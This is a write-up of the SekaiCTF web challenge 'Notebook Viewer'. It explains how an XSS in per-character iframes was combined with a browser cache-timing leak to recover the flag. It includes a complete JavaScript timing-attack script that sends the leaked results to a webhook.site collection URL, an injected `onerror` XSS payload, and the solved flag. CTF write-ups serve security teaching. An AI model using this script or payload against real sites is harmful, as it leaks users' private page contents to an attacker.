---
title: Notebook Viewer
summary: Miku created this notebook, can you extract its secrets?
tags: [SekaiCTF, Web, Timing Attack]
date: 2025-08-18
---

## Description

Miku created this notebook, can you extract its secrets?

Flag format: `SEKAI{[a-zA-Z0-9{}$@(<&!*#+_\-]+}`

Difficulty: 🔶🔶🔶🔷  
Author: Qyn

[Admin bot](https://ctf.sekai.team/adminbot/nbv)  
[Given files](/sekaictf/notebook-viewer/nbv-dist.7z)

## Solution

The challenge presents a single HTML page displaying a notebook.

![index.html](/sekaictf/notebook-viewer/index.png)

From examining the bot's source code, we know that we need to retrieve the secret note from another browser tab.

```adminbot.js
let page1 = await browser.newPage();
await page1.goto(`${SITE}/?note=${encodeURIComponent(FLAG)}`, {
    waitUntil: "networkidle2"
});

let page2 = await browser.newPage();
await page2.goto(url);
```

At first glance, this seems impossible because browser tabs typically can't interact with each other.
However, let's explore further.

The first thing I attempted was an XSS attack in the secret note with `?note=<img src=x onerror=alert('XSS') />`, but this didn't work.
I then inspected the page's JavaScript code to see if any sanitization was applied.
There was no sanitization, but the text was displayed in a peculiar way: each letter was rendered in its own iframe, preventing the XSS from executing.

```index.js
const uri = new URL(location.href);
const note = uri.searchParams.get('note') || 'my secret notes';

function srcFor(i, code) {
  return `https://nbv-${i}-${code}.chals.sekai.team/`;
}

for (let i = 0; i < note.length; i++) {
  const code = note.codePointAt(i);
  const frame = document.createElement('iframe');
  frame.scrolling = 'no';
  frame.src = srcFor(i, code);
  wrap.appendChild(frame);
}
```

Upon inspecting the iframe code, I discovered that it simply displayed the letter specified in its URL or the text passed through the query parameter.
This opened the door for an XSS vulnerability.

```frame.js
let uri = new URL(location.href);
const note = uri.searchParams.get("note");
const txt = document.querySelector('#note');

if (note)
    txt.innerHTML = note;
else
    txt.innerHTML = String.fromCharCode(uri.host.split('-')[2].split('.')[0]);
```

At this point, I had reviewed the provided files, understood how the application worked, found an XSS vulnerability, but still had no clear idea on how to retrieve the flag.

Then, I asked myself: why does the `srcFor` function include the character position when building the iframe URL? It isn't use by the iframe.
That's when it clicked: the combination of the character position and code was used to generate a unique URL for each letter, which potentially exposed the website to a resource timing attack.

### Timing Attack

Let's break down how the website operates:
- The flag is stored as a secret note.
- For each letter, the website sends a request to a URL containing the letter's position and code, and displays the letter in an iframe.
- Because the browser caches these requests, we can exploit this by making requests for all possible letters and observe which one is served fastest.
- The letter that is served the quickest will be the one already cached — meaning it’s part of the flag.

To automate this process, I wrote a script that attempts all characters for a given position and reports the most probable characters, ordered by fetch time, via a webhook.
While I could have attempted to guess multiple letters at once, I avoided this as it might have caused the flag request to become uncached due to the large volume of requests made by the script.

```js
const INDEX = 1; // Letter position
const CHARSET = shuffle(
  // Shuffle the charset to avoid giving an advantage to the first letters
  "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}@(<&!*#+_-",
);

const URL = (i, code) => `https://nbv-${i}-${code}.chals.sekai.team/`;
const WEBHOOK = "https://webhook.site/e5245448-2fa6-417d-9348-65d36f92d28e/";

function shuffle(str) {
  const array = str.split("");
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array.join("");
}

function sort(dict) {
  let items = Object.keys(dict).map(function (key) {
    return [key, dict[key]];
  });

  items.sort(function (first, second) {
    return first[1] - second[1];
  });

  return items.map((key) => key[0]);
}

async function timingAttack() {
  const fetchPromises = []; // Array to store all fetch promises
  const charTimes = {}; // Object to store character-fetch times

  // PerformanceObserver to monitor network fetch timings
  let observer = new PerformanceObserver((list) => {
    list.getEntries().forEach((entry) => {
      const timeToFetch = entry.responseEnd - entry.fetchStart;
      if (timeToFetch > 0 && entry.name.includes("chals.sekai.team")) {
        const char = String.fromCharCode(
          entry.name.split("-")[2].split(".")[0],
        );
        charTimes[char] = timeToFetch;
      }
    });
  });

  observer.observe({ type: "resource", buffered: true });

  // Fetch the iframe URL for each character
  for (const c of CHARSET) {
    fetchPromises.push(fetch(URL(INDEX, c.charCodeAt(0)), { mode: "no-cors" }));
  }

  // Wait for all fetch requests to complete
  await Promise.all(fetchPromises);

  observer.disconnect();

  // Send the results (sorted character fetch times) to the webhook
  fetch(`${WEBHOOK}?${INDEX}=${encodeURIComponent(sort(charTimes).join(""))}`, {
    mode: "no-cors",
  });
}

timingAttack();
```

To execute the script, I used the XSS vulnerability I discovered earlier, embedding the link to the admin bot: `https://nbv-0-83.chals.sekai.team/?note=<img src=x onerror='[URL_ENCODED_SCRIPT]' />`.
Using this technique, I was able to retrieve the entire flag, one letter at a time, by sending my link to the admin bot 4-5 times per letter to determine the consistently fastest letter.

```
SEKAI{prOc3s5_IsoLAT10n_X5l34K5_fTW}
```

## References

* Practical CTF: [Timing Attacks](https://book.jorianwoltjer.com/cryptography/timing-attacks)
